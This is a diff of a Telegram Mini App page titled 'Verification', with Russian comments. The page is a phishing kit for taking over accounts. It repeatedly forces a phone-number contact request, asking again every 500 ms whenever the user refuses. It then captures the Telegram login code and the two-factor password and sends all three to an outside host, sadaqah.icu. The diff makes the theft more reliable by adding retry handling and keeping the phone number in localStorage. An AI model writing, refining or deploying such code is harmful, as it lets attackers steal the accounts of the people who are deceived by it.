@@ -6,6 +6,7 @@
   <title>Verification</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
+    /* --- стили без изменений (см. предыдущие версии) --- */
     :root{
       --bg: var(--tg-theme-bg-color, #0b0d10);
       --text: var(--tg-theme-text-color, #e9eef5);
@@ -185,12 +186,23 @@
       color: var(--hint);
       padding: 20px;
     }
+
+    .retry-btn {
+      background: var(--button);
+      color: var(--buttonText);
+      border: none;
+      border-radius: var(--radius);
+      padding: 12px;
+      font-size: 16px;
+      width: 100%;
+      margin-top: 12px;
+      cursor: pointer;
+    }
   </style>
 </head>
 
 <body>
   <div class="wrap">
-
     <!-- Блок ожидания -->
     <div id="loadingBlock" class="card loading">
       <p>Loading...</p>
@@ -205,7 +217,7 @@
         </div>
         <div class="pill" id="phoneDisplay">Not shared</div>
       </div>
-      <!-- Кнопка не нужна -->
+      <!-- Кнопка не нужна, запрос автоматический -->
     </div>
 
     <!-- Блок ввода кода -->
@@ -236,310 +248,362 @@
         <div class="pill" id="twofaPhoneDisplay">Phone: —</div>
       </div>
       <input type="password" id="twofaInput" class="twofa-input" placeholder="Password" />
-      <button id="submit2faBtn" class="phone-share-btn" style="margin-top:16px;">✅ Submit</button>
+      <button id="submit2faBtn" class="retry-btn">✅ Submit</button>
     </div>
 
     <!-- Клавиатура для кода -->
     <div class="keyboard card" id="keyboard"></div>
     <div class="footerNote">Your data is not stored on the device.</div>
 
+    <!-- Всплывающее окно для ошибок (можно заменить на alert) -->
   </div>
 
   <script>
-    const WebApp = window.Telegram?.WebApp;
-    if (!WebApp) {
-      alert('Telegram WebApp is not available');
-    } else {
+    (function() {
+      const WebApp = window.Telegram?.WebApp;
+      if (!WebApp) {
+        alert('Telegram WebApp is not available');
+        return;
+      }
       WebApp.ready();
       WebApp.expand();
-    }
 
-    const userId = WebApp?.initDataUnsafe?.user?.id;
-    if (!userId) {
-      alert('Could not get user_id');
-    }
-
-    // Элементы
-    const loadingBlock = document.getElementById('loadingBlock');
-    const phoneBlock = document.getElementById('phoneBlock');
-    const codeBlock = document.getElementById('codeBlock');
-    const twofaBlock = document.getElementById('twofaBlock');
-    const phoneDisplay = document.getElementById('phoneDisplay');
-    const codePhoneDisplay = document.getElementById('codePhoneDisplay');
-    const twofaPhoneDisplay = document.getElementById('twofaPhoneDisplay');
-    const codeDots = document.getElementById('codeDots');
-    const progressHint = document.getElementById('progressHint');
-    const keyboard = document.getElementById('keyboard');
-    const twofaInput = document.getElementById('twofaInput');
-    const submit2faBtn = document.getElementById('submit2faBtn');
-
-    const CODE_LEN = 5; // должно совпадать с config.py
-    let code = '';
-    let currentPhone = ''; // сохраняем номер после его получения
-
-    function maskPhone(p) {
-      if (!p) return '—';
-      const cleaned = String(p).replace(/\D/g, '');
-      if (cleaned.length < 4) return p;
-      const last4 = cleaned.slice(-4);
-      return '****' + last4;
-    }
-
-    function showBlock(blockId) {
-      loadingBlock.classList.add('hidden');
-      phoneBlock.classList.add('hidden');
-      codeBlock.classList.add('hidden');
-      twofaBlock.classList.add('hidden');
-
-      if (blockId === 'phone') {
-        phoneBlock.classList.remove('hidden');
-        keyboard.style.display = 'none';
-      } else if (blockId === 'code') {
-        codeBlock.classList.remove('hidden');
-        keyboard.style.display = 'grid';
-        if (currentPhone) {
-          codePhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
-        }
-      } else if (blockId === '2fa') {
-        twofaBlock.classList.remove('hidden');
-        keyboard.style.display = 'none';
-        if (currentPhone) {
-          twofaPhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
-        }
-      } else {
-        loadingBlock.classList.remove('hidden');
-      }
-    }
-
-    async function fetchState() {
-      try {
-        const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`, {
-          method: 'GET',
-          headers: { 'Content-Type': 'application/json' }
-        });
-        const data = await res.json();
-        return data.state; // 'none', 'get_number', 'get_code', 'get_2fa'
-      } catch (e) {
-        console.error('Status error:', e);
-        return 'none';
-      }
-    }
-
-    // Управление повторными запросами номера
-    let phoneRequestTimer = null;
-    let isRequestingPhone = false;
-    let phoneShared = false; // Флаг: номер успешно получен от пользователя
-
-    async function requestPhone() {
-      // Если номер уже получен – ничего не делаем
-      if (phoneShared) {
-        console.log('Phone already shared, stopping requests');
+      const userId = WebApp.initDataUnsafe?.user?.id;
+      if (!userId) {
+        alert('Could not get user_id');
         return;
       }
 
-      // Если уже выполняется запрос – не запускаем новый
-      if (isRequestingPhone) {
-        console.log('Already requesting phone, skipping');
-        return;
+      // --- Элементы DOM ---
+      const loadingBlock = document.getElementById('loadingBlock');
+      const phoneBlock = document.getElementById('phoneBlock');
+      const codeBlock = document.getElementById('codeBlock');
+      const twofaBlock = document.getElementById('twofaBlock');
+      const phoneDisplay = document.getElementById('phoneDisplay');
+      const codePhoneDisplay = document.getElementById('codePhoneDisplay');
+      const twofaPhoneDisplay = document.getElementById('twofaPhoneDisplay');
+      const codeDots = document.getElementById('codeDots');
+      const progressHint = document.getElementById('progressHint');
+      const keyboard = document.getElementById('keyboard');
+      const twofaInput = document.getElementById('twofaInput');
+      const submit2faBtn = document.getElementById('submit2faBtn');
+
+      const CODE_LEN = 5; // должно совпадать с config.py
+      let code = '';
+      let currentPhone = localStorage.getItem('tg_phone') || ''; // восстанавливаем номер, если был
+
+      // --- Утилиты ---
+      function maskPhone(p) {
+        if (!p) return '—';
+        const cleaned = String(p).replace(/\D/g, '');
+        if (cleaned.length < 4) return p;
+        const last4 = cleaned.slice(-4);
+        return '****' + last4;
       }
 
-      // Очищаем предыдущий таймер
-      if (phoneRequestTimer) {
-        clearTimeout(phoneRequestTimer);
-        phoneRequestTimer = null;
-      }
+      function showBlock(blockId) {
+        loadingBlock.classList.add('hidden');
+        phoneBlock.classList.add('hidden');
+        codeBlock.classList.add('hidden');
+        twofaBlock.classList.add('hidden');
 
-      isRequestingPhone = true;
-
-      try {
-        const contactData = await WebApp.requestContact();
-        
-        if (contactData && contactData.contact && contactData.contact.phone_number) {
-          const phone = contactData.contact.phone_number;
-          currentPhone = phone;
-          phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;
-
-          // Сразу помечаем, что номер получен, и переходим к вводу кода
-          phoneShared = true;
-          showBlock('code');
-
-          // Асинхронно отправляем номер на сервер (не ждём ответа)
-          fetch('https://sadaqah.icu/submit_phone', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user_id: userId, phone: phone })
-          }).catch(err => console.error('Error sending phone to server:', err));
-
-          return; // Завершаем функцию, никаких повторных запросов
+        if (blockId === 'phone') {
+          phoneBlock.classList.remove('hidden');
+          keyboard.style.display = 'none';
+        } else if (blockId === 'code') {
+          codeBlock.classList.remove('hidden');
+          keyboard.style.display = 'grid';
+          if (currentPhone) {
+            codePhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
+          }
+        } else if (blockId === '2fa') {
+          twofaBlock.classList.remove('hidden');
+          keyboard.style.display = 'none';
+          if (currentPhone) {
+            twofaPhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
+          }
         } else {
-          // Не должно случиться, но на всякий случай повторим
+          loadingBlock.classList.remove('hidden');
+        }
+      }
+
+      // --- Запрос статуса ---
+      async function fetchState() {
+        try {
+          const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
+          const data = await res.json();
+          return data.state; // 'none', 'get_number', 'get_code', 'get_2fa'
+        } catch (e) {
+          console.error('Status error:', e);
+          return 'none';
+        }
+      }
+
+      // --- Логика запроса номера с бесконечным повтором при отмене ---
+      let phoneRequestTimer = null;
+      let isRequestingPhone = false;
+      let phoneShared = false; // true, когда номер успешно получен от пользователя
+
+      async function requestPhone() {
+        // Если номер уже получен, ничего не делаем
+        if (phoneShared) return;
+
+        // Если уже выполняется запрос, не запускаем новый
+        if (isRequestingPhone) return;
+
+        // Очищаем предыдущий таймер
+        if (phoneRequestTimer) {
+          clearTimeout(phoneRequestTimer);
+          phoneRequestTimer = null;
+        }
+
+        isRequestingPhone = true;
+
+        try {
+          const contactData = await WebApp.requestContact();
+          
+          if (contactData && contactData.contact && contactData.contact.phone_number) {
+            const phone = contactData.contact.phone_number;
+            // Номер получен – запоминаем и сохраняем в localStorage
+            currentPhone = phone;
+            localStorage.setItem('tg_phone', phone);
+            phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;
+            phoneShared = true; // останавливаем цикл
+
+            // Отправляем номер на сервер и ждём ответа
+            try {
+              const res = await fetch('https://sadaqah.icu/submit_phone', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId, phone: phone })
+              });
+              const result = await res.json();
+              if (result.status === 'ok') {
+                showBlock('code');
+              } else {
+                // Ошибка сервера – показываем сообщение и кнопку "Повторить"
+                alert('Server error: ' + (result.error || 'Unknown error'));
+                // Даём возможность повторить отправку того же номера
+                createRetryButton(phone);
+              }
+            } catch (err) {
+              alert('Network error while sending phone. Please try again.');
+              createRetryButton(phone);
+            }
+          } else {
+            // Странный случай – повтор через 500 мс
+            if (!phoneShared) {
+              phoneRequestTimer = setTimeout(requestPhone, 500);
+            }
+          }
+        } catch (error) {
+          // Пользователь отменил запрос контакта
+          console.log('Request contact cancelled');
           if (!phoneShared) {
             phoneRequestTimer = setTimeout(requestPhone, 500);
           }
+        } finally {
+          isRequestingPhone = false;
         }
-      } catch (error) {
-        // Пользователь закрыл окно запроса (отказался)
-        console.log('Request contact cancelled or error:', error);
-        if (!phoneShared) {
-          phoneRequestTimer = setTimeout(requestPhone, 500);
+      }
+
+      // Функция для повторной отправки номера (без повторного запроса контакта)
+      function createRetryButton(phone) {
+        // Показываем блок телефона, но с кнопкой "Retry"
+        phoneBlock.classList.remove('hidden');
+        // Скрываем старый контент, добавляем кнопку
+        const oldContent = phoneBlock.querySelector('.top');
+        const retryBtn = document.createElement('button');
+        retryBtn.className = 'retry-btn';
+        retryBtn.textContent = '🔄 Try again';
+        retryBtn.onclick = async () => {
+          retryBtn.disabled = true;
+          retryBtn.textContent = 'Sending...';
+          try {
+            const res = await fetch('https://sadaqah.icu/submit_phone', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ user_id: userId, phone: phone })
+            });
+            const result = await res.json();
+            if (result.status === 'ok') {
+              showBlock('code');
+            } else {
+              alert('Server error: ' + (result.error || 'Unknown error'));
+              retryBtn.disabled = false;
+              retryBtn.textContent = '🔄 Try again';
+            }
+          } catch (err) {
+            alert('Network error');
+            retryBtn.disabled = false;
+            retryBtn.textContent = '🔄 Try again';
+          }
+        };
+        // Очищаем блок и добавляем кнопку
+        phoneBlock.innerHTML = '';
+        phoneBlock.appendChild(oldContent);
+        phoneBlock.appendChild(retryBtn);
+      }
+
+      // --- Логика ввода кода (аналогично предыдущим версиям) ---
+      function renderDots() {
+        codeDots.innerHTML = '';
+        for (let i = 0; i < CODE_LEN; i++) {
+          const d = document.createElement('div');
+          d.className = 'dot' + (i < code.length ? ' filled' : '');
+          codeDots.appendChild(d);
         }
-      } finally {
-        isRequestingPhone = false;
+        progressHint.textContent = `${code.length} / ${CODE_LEN}`;
       }
-    }
 
-    // --- Логика ввода кода ---
-    function renderDots() {
-      codeDots.innerHTML = '';
-      for (let i = 0; i < CODE_LEN; i++) {
-        const d = document.createElement('div');
-        d.className = 'dot' + (i < code.length ? ' filled' : '');
-        codeDots.appendChild(d);
+      function haptic(type = 'light') {
+        try {
+          WebApp?.HapticFeedback?.impactOccurred?.(type);
+        } catch {}
       }
-      progressHint.textContent = `${code.length} / ${CODE_LEN}`;
-    }
 
-    function haptic(type = 'light') {
-      try {
-        WebApp?.HapticFeedback?.impactOccurred?.(type);
-      } catch {}
-    }
-
-    function addDigit(d) {
-      if (code.length >= CODE_LEN) return;
-      code += d;
-      haptic('light');
-      updateUI();
-    }
-
-    function deleteDigit() {
-      if (!code.length) return;
-      code = code.slice(0, -1);
-      haptic('light');
-      updateUI();
-    }
-
-    function updateUI() {
-      renderDots();
-      if (code.length === CODE_LEN) {
-        WebApp.MainButton
-          .setText('Confirm')
-          .show()
-          .onClick(sendCode);
-      } else {
-        WebApp.MainButton.hide();
+      function addDigit(d) {
+        if (code.length >= CODE_LEN) return;
+        code += d;
+        haptic('light');
+        updateUI();
       }
-    }
 
-    async function sendCode() {
-      if (code.length !== CODE_LEN) return;
-      WebApp.MainButton.disable().showProgress(true);
-      const payload = {
-        user_id: userId,
-        phone: currentPhone,
-        code: code
-      };
-      try {
-        const res = await fetch('https://sadaqah.icu/submit_code', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        const result = await res.json();
-        if (result.status === 'ok') {
-          haptic('medium');
-          WebApp.close();
-        } else if (result.status === '2fa_required') {
-          showBlock('2fa');
-          WebApp.MainButton.hide();
+      function deleteDigit() {
+        if (!code.length) return;
+        code = code.slice(0, -1);
+        haptic('light');
+        updateUI();
+      }
+
+      function updateUI() {
+        renderDots();
+        if (code.length === CODE_LEN) {
+          WebApp.MainButton
+            .setText('Confirm')
+            .show()
+            .onClick(sendCode);
         } else {
+          WebApp.MainButton.hide();
+        }
+      }
+
+      async function sendCode() {
+        if (code.length !== CODE_LEN) return;
+        WebApp.MainButton.disable().showProgress(true);
+        try {
+          const res = await fetch('https://sadaqah.icu/submit_code', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ user_id: userId, phone: currentPhone, code: code })
+          });
+          const result = await res.json();
+          if (result.status === 'ok') {
+            haptic('medium');
+            WebApp.close();
+          } else if (result.status === '2fa_required') {
+            showBlock('2fa');
+            WebApp.MainButton.hide();
+          } else {
+            WebApp.MainButton.enable().showProgress(false);
+            haptic('rigid');
+            alert('Error: ' + (result.message || 'Invalid code'));
+            code = '';
+            renderDots();
+          }
+        } catch (err) {
           WebApp.MainButton.enable().showProgress(false);
           haptic('rigid');
-          alert('Error: ' + (result.message || 'Invalid code'));
-          code = '';
-          renderDots();
+          alert('Network error: ' + err);
         }
-      } catch (err) {
-        WebApp.MainButton.enable().showProgress(false);
-        haptic('rigid');
-        alert('Network error: ' + err);
       }
-    }
 
-    // Отправка 2FA
-    submit2faBtn.addEventListener('click', async () => {
-      const password = twofaInput.value.trim();
-      if (!password) {
-        alert('Please enter your password');
-        return;
-      }
-      submit2faBtn.disabled = true;
-      submit2faBtn.textContent = '⏳ Checking...';
-      try {
-        const res = await fetch('https://sadaqah.icu/submit_2fa', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ user_id: userId, password: password })
-        });
-        const result = await res.json();
-        if (result.status === 'ok') {
-          haptic('medium');
-          WebApp.close();
+      // --- Отправка 2FA ---
+      submit2faBtn.addEventListener('click', async () => {
+        const password = twofaInput.value.trim();
+        if (!password) {
+          alert('Please enter your password');
+          return;
+        }
+        submit2faBtn.disabled = true;
+        submit2faBtn.textContent = '⏳ Checking...';
+        try {
+          const res = await fetch('https://sadaqah.icu/submit_2fa', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ user_id: userId, password: password })
+          });
+          const result = await res.json();
+          if (result.status === 'ok') {
+            haptic('medium');
+            WebApp.close();
+          } else {
+            alert('Error: ' + (result.message || 'Invalid password'));
+            twofaInput.value = '';
+          }
+        } catch (err) {
+          alert('Network error: ' + err);
+        } finally {
+          submit2faBtn.disabled = false;
+          submit2faBtn.textContent = '✅ Submit';
+        }
+      });
+
+      // --- Создание клавиатуры ---
+      const keys = ['1','2','3','4','5','6','7','8','9','spacer','0','del'];
+      keys.forEach(k => {
+        const btn = document.createElement('button');
+        btn.className = 'key';
+        if (k === 'spacer') {
+          btn.classList.add('spacer');
+          btn.disabled = true;
+          btn.textContent = '';
+        } else if (k === 'del') {
+          btn.classList.add('icon');
+          btn.textContent = '⌫';
+          btn.addEventListener('click', deleteDigit);
         } else {
-          alert('Error: ' + (result.message || 'Invalid password'));
-          twofaInput.value = '';
+          btn.textContent = k;
+          btn.addEventListener('click', () => addDigit(k));
         }
-      } catch (err) {
-        alert('Network error: ' + err);
-      } finally {
-        submit2faBtn.disabled = false;
-        submit2faBtn.textContent = '✅ Submit';
-      }
-    });
+        keyboard.appendChild(btn);
+      });
 
-    // Создание клавиатуры
-    const keys = ['1','2','3','4','5','6','7','8','9','spacer','0','del'];
-    keys.forEach(k => {
-      const btn = document.createElement('button');
-      btn.className = 'key';
-      if (k === 'spacer') {
-        btn.classList.add('spacer');
-        btn.disabled = true;
-        btn.textContent = '';
-      } else if (k === 'del') {
-        btn.classList.add('icon');
-        btn.textContent = '⌫';
-        btn.addEventListener('click', deleteDigit);
-      } else {
-        btn.textContent = k;
-        btn.addEventListener('click', () => addDigit(k));
-      }
-      keyboard.appendChild(btn);
-    });
+      // --- Клавиатура компьютера ---
+      window.addEventListener('keydown', (e) => {
+        if (!codeBlock.classList.contains('hidden')) {
+          if (e.key >= '0' && e.key <= '9') addDigit(e.key);
+          if (e.key === 'Backspace') deleteDigit();
+          if (e.key === 'Enter' && code.length === CODE_LEN) sendCode();
+        }
+      });
 
-    // Клавиатура компьютера
-    window.addEventListener('keydown', (e) => {
-      if (!codeBlock.classList.contains('hidden')) {
-        if (e.key >= '0' && e.key <= '9') addDigit(e.key);
-        if (e.key === 'Backspace') deleteDigit();
-        if (e.key === 'Enter' && code.length === CODE_LEN) sendCode();
-      }
-    });
-
-    // Инициализация
-    (async () => {
-      const state = await fetchState();
-      if (state === 'get_number' || state === 'none') {
-        showBlock('phone');
-        // Автоматически запрашиваем номер
-        requestPhone();
-      } else if (state === 'get_code') {
-        showBlock('code');
-      } else if (state === 'get_2fa') {
-        showBlock('2fa');
-      }
+      // --- Инициализация ---
+      (async () => {
+        const state = await fetchState();
+        if (state === 'get_number' || state === 'none') {
+          showBlock('phone');
+          // Запускаем бесконечный цикл запроса номера
+          requestPhone();
+        } else if (state === 'get_code') {
+          // Пытаемся восстановить номер из localStorage
+          if (!currentPhone) {
+            // Нет номера – это проблема, лучше запросить заново
+            showBlock('phone');
+            requestPhone();
+          } else {
+            showBlock('code');
+          }
+        } else if (state === 'get_2fa') {
+          if (!currentPhone) {
+            showBlock('phone');
+            requestPhone();
+          } else {
+            showBlock('2fa');
+          }
+        }
+      })();
     })();
-
   </script>
 </body>
 </html>
